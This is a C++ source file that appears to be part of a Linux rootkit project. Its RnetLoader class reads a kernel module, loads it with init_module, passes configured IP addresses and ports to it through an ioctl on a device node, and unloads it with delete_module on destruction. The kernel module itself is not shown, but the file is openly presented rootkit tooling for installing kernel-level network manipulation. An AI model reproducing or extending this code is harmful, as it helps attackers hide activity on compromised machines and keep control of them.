#include "rootkit/RnetLoader.hpp"
#include "common.h"
#include "rootkit/ConfigManager.hpp"
#include "rootkit/Utils.hpp"
#include "rootkit/issues/Logger.hpp"
#include "rootkit/issues/Warning.hpp"

#include <fcntl.h>
#include <cerrno>
#include <cstring>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <cstdint>
#include <format>

rootkit::RnetLoader::RnetLoader(const RnetConfig& conf,
                        const std::string& module_dev_name,
                        const issues::Logger& logger
)
    :conf(conf),
    module_name(conf.module_name),
    module_path(conf.module_path),
    module_dev_name(module_dev_name),
    error(logger),
    warning(logger),
    data({})
{
    int fd = open(module_path.c_str(), O_RDONLY);
    if (fd < 0) {
        error = "file " + module_path + " cannot be read";
        return;
    }

    // Get file size
    off_t size = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);

    // Read module into memory
    uint8_t * module_data = (uint8_t *) malloc(size);
    read(fd, module_data, size);
    close(fd);

    // Load module, and save error message if there is any
    if (init_module(module_data, size, "") < 0) {
        int saved_errno = errno;
        // Get error message
        const char * msg = std::strerror(saved_errno);
        std::string error_msg = "";
        if (msg && *msg)
            error_msg = std::format("init_module: {}", msg);

        // Check if the error is permission or module state
        if (saved_errno == EPERM) {
            error_msg += "\nPermission denied - check SELinux status, secure boot, or capabilities";
        } else if (saved_errno == EEXIST) {
            error_msg += "\nModule already loaded";
        } else if (saved_errno == ENOEXEC) {
            error_msg += "\nModule format error";
        }
        error = error_msg;
    }

    if (status() == std::nullopt) {
        set_data();
    }
}

rootkit::RnetLoader::~RnetLoader() {
    // Check for error in loading, and if any don't unload the kernel module
    if (!error.empty())
        return;
    // Unload module
    if (delete_module(module_name.c_str(), O_NONBLOCK) < 0) {
        perror("Error unloading module");
    }
}

std::optional<std::string> rootkit::RnetLoader::status() const {
    if (!error.empty())
        return error.get_message();
    return std::nullopt;
}

bool rootkit::RnetLoader::set_data() {
    for (const auto& ip_and_port : conf.ips_and_ports) {
        auto ip = utils::convert_ip(ip_and_port.first);
        if (!ip.has_value()) {
            warning = std::format("ip {} couldn't be converted", ip_and_port.first);
            continue;
        }

        conn_info conn_data;
        conn_data.dport = ip_and_port.second;
        conn_data.daddr = ip.value();

        if (!this->set_data(conn_data)) {
            return false;
        }
    }

    return true;
}

bool rootkit::RnetLoader::set_data(const conn_info& data) {
    std::string dev_name = "/dev/" + module_dev_name;
    int fd = open(dev_name.c_str(), O_RDWR);
    if (fd < 0) {
        perror("Failed to open device");
        return false;
    }

    // Send data via ioctl
    if (ioctl(fd, IOCTL_SEND_DATA, &data) < 0) {
        perror("ioctl failed");
        close(fd);
        return false;
    }
    close(fd);

    // Set data internally
    this->data.push_back(data);

    return true;
}

std::vector<conn_info> rootkit::RnetLoader::get_data() const {
    return data;
}
